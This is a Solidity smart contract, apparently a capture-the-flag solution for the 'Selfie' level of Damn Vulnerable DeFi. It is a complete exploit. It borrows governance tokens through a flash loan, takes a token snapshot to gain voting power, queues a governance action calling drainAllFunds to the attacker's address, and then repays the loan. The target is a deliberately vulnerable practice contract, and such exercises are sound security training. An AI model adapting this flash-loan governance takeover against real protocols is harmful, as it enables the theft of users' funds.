// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";
import {console} from "../Console.sol";

// import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";

/**
 * @title AttackSelfiePool
 * @author sidarth16
 */

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

contract AttackSelfiePool {

    using Address for address;

    DamnValuableTokenSnapshot token ;
    address flashLoanPool ;
    address governance;
    address attacker;
    uint256 actionId;

    constructor (
        address _token,
        address _flashLoanPool,
        address _governance
    ) {
        // rewarderPool = TheRewarderPool(_rewardPool);
        flashLoanPool = _flashLoanPool;
        token = DamnValuableTokenSnapshot(_token);
        governance = _governance;
        attacker = msg.sender;
    }

    function attack(uint256 amt) external returns (uint256)
    {   
        
        console.log("Attack called for : ",amt);
        IFlashLoanerPool(flashLoanPool).flashLoan(amt);
        return actionId;
        // // Send Looted tokens to the attacker
        // uint256 rewards_balance = rewardToken.balanceOf(address(this));
        // rewardToken.transfer(attacker , rewards_balance );
    }

    function receiveTokens(address _token, uint256 amt) external {
        console.log("Received Flashloan : ",amt);
        
        token.snapshot();

        console.log("add QueueAction : drainAllFunds");
        bytes memory returndata =  governance.functionCall(
            abi.encodeWithSignature(
                "queueAction(address,bytes,uint256)",
                flashLoanPool,
                abi.encodeWithSignature("drainAllFunds(address)", attacker),
                0
            )
        ); 
        actionId = abi.decode(returndata, (uint256));
        console.log("Added Successfully: Id = ",actionId);

        // Transfer amt back to the pool
        IERC20(_token).transfer(flashLoanPool, amt);

    }

}
